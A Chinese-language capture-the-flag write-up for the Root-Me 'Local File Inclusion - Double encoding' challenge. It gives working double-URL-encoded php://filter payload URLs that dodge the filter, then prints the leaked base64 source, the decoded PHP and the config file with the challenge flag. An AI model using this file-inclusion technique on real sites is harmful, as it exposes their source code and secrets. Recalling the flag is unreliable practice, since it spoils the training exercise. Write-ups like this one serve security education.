Root-Me [Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
===

一個網頁，有三個可切換頁面。

## 解題關鍵
1. LFI
2. PHP filters
3. Base64

## 提示訊息
```
Find the validation password in the source files of the website.
```

## 解題方法
該題與上一題一樣，注意 URL 的變化，首先把 `page` 
變更為 `index`，會出現錯誤訊息，如下。  

```
Warning: include(index.inc.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch45/index.php on line 7

Warning: include(): Failed opening 'index.inc.php' for inclusion (include_path='.:/usr/share/php') in /challenge/web-serveur/ch45/index.php on line 7
```

可以發現關鍵位置 `include(index.inc.php)`，參數值 `index` 還被加上了 `inc.php` 後輟，嘗試加上 `../` 等參數，發現 `.`、`/` 都有被擋掉，只要有使用就會出現 `Attack detected.`，並且觀察輸入應為 `include($_GET['page'].inc.php)`，其實是符合 `php://filter` 的條件，目前知道的路徑如下。

```
home.inc.php
cv.inc.php
contact.inc.php
```

首先要解決過濾的問題，標題就給了大方向 `Double encoding`，做了二次 `urlencode`，所以像是 `.`，就會變成 `%252e` 其中 `%25` 解碼之後為 `%` 再加上後方的 `2e` 變成 `%2e` 此時在解碼就會變成 `.`。  

若 Payload 如下：  

```
http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=home
```

就必須 `URLencode` 兩次，如下：  

```
http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252ebase64-encode%252Fresource%253Dhome
```

接著得到下方的 Base64：  

```
PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIEhvbWU8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDw/PSAkY29uZlsnZ2xvYmFsX3N0eWxlJ10gPz4KICAgIDxuYXY+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWhvbWUiIGNsYXNzPSJhY3RpdmUiPkhvbWU8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWN2Ij5DVjwvYT4KICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9Y29udGFjdCI+Q29udGFjdDwvYT4KICAgIDwvbmF2PgogICAgPGRpdiBpZD0ibWFpbiI+CiAgICAgIDw/PSAkY29uZlsnaG9tZSddID8+CiAgICA8L2Rpdj4KICA8L2JvZHk+CjwvaHRtbD4K
```

解碼後得到：  

```PHP
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>

```

接著發現目標為 `conf.inc.php`，修改 Payload 再照著上面的步驟 Run 一次，就會得到下面的資料，解決該題。

```PHP
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];
```

## Reference
https://blog.cfyqy.com/article/62dcc0a4.html

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)